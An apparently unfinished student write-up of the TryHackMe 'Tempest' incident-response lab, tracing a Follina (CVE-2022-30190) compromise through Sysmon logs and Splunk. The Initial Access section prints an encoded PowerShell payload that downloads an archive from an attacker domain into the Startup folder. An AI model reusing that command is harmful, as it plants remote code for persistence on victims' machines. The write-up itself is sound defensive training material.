# [SIEM Triage for SOC]

**TryHackMe Path**: [SOC Level 1]  
**Lab Topic**: [Tempest]  
**Date Completed**: [04//2026]

---

## 🧠 Summary

> In this lab, I learned how to 

---

## 🎯 Objectives
- [ ] Complete Challenge Room
      
---

## 🧰 Tools Used
- THM AttackBox
- Splunk

---

## 📊 Analysis & Screenshots

*** Preparation - Tools and Artefacts ***

> In this room, i had to play the role of an incident responder focusing on handling and analyzing the captured artefacts of a compromised machine. For the first section i had to
answer questions based on the artefacts and tools needed for the investigation. For the first question i had to figure out the SHA256 of the capture.pcapng file. I retrieved the
SHA256 hash by launching powershell, then inputting the command syntax "Get-FileHash .\capture.pcapng," which then returned
"CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6."
>
> <img width="892" height="879" alt="1" src="https://github.com/user-attachments/assets/df453969-50b6-4323-8ce1-a10469126050" />

> For the next question i retrieved the SHA256 hash of the sysmon.evtx file to be "665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F."
>
> <img width="1036" height="147" alt="2" src="https://github.com/user-attachments/assets/abd891ab-8058-463a-95ff-1a0e9a901fa6" />

> For the last question of this section i retrieved the SHA256 hash of the windows.evtx file to be "D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60."
>
> <img width="1100" height="135" alt="3" src="https://github.com/user-attachments/assets/7ed2cc95-4d2e-4f64-b89c-2bbe05eaff16" />

*** Initial Access - Malicious Document ***

> For this section i had to investigate an alert that an Analyst labelled as "CRITICAL" severity. I had to use data source:
Sysmon.
For the first question i had to figure out which malicious document the user of this machine was compromised by. After further investigation i was able to retrieve the malicious
document named "free_magicules.doc."
>
> <img width="1152" height="647" alt="4" src="https://github.com/user-attachments/assets/00ad8403-7b97-486b-93cc-4b0169218775" />
> <img width="786" height="355" alt="5" src="https://github.com/user-attachments/assets/c13c279a-39bd-494c-a6d2-07cc94aee2fa" />
> <img width="1245" height="465" alt="6" src="https://github.com/user-attachments/assets/ff5728de-9af5-4afd-94a4-ec063e4504eb" />

> Moving on to the next question i wa sable to retrieve the compromised user and machine to be "benimaru-TEMPEST."
>
> <img width="1022" height="360" alt="7" src="https://github.com/user-attachments/assets/17e84ef2-fe15-469b-a8ad-e9872b2cd4a3" />

> The PID of the Microsoft Word process that opened the malicious document was discovered to be "496" within the Payload Data1 column.
>
> <img width="727" height="292" alt="8" src="https://github.com/user-attachments/assets/09e58590-0bbd-4bcc-a1e2-446c3a35deb1" />

> For the next question based on the Sysmon logs, the IPv4 address resolved by the malicious domain was discovered to be "167.71.199.191."
>
> <img width="1076" height="550" alt="9" src="https://github.com/user-attachments/assets/40247c58-ca95-4695-a9fa-c86a9eb358b9" />

> Moving on, i retrieved the Base64 encoded string in the malicious payload executed by the document to be:
NhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==
>
> <img width="1131" height="658" alt="10" src="https://github.com/user-attachments/assets/97e29add-ad88-4186-959c-50d66c6ddb1a" />

> I then identified the CVE number of the exploit used by the attacker to achieve a remote code execution to be:
2022-30190
I retrieved it by locating the binary with the same Base64 string, then inputted the binary within the input field of the LOLBAS website.
>
> <img width="1166" height="563" alt="11" src="https://github.com/user-attachments/assets/b7b95b57-9779-472c-b8a3-415fdebd5153" />
> <img width="1119" height="478" alt="12" src="https://github.com/user-attachments/assets/6ba876b0-be95-4240-847c-cc1ff23b4cbc" />
> <img width="1113" height="200" alt="13" src="https://github.com/user-attachments/assets/3b134a7b-db4c-4228-bf21-cfd65467fd89" />

> 












--- 

## Reflection

> This lab strengthened my ability to 
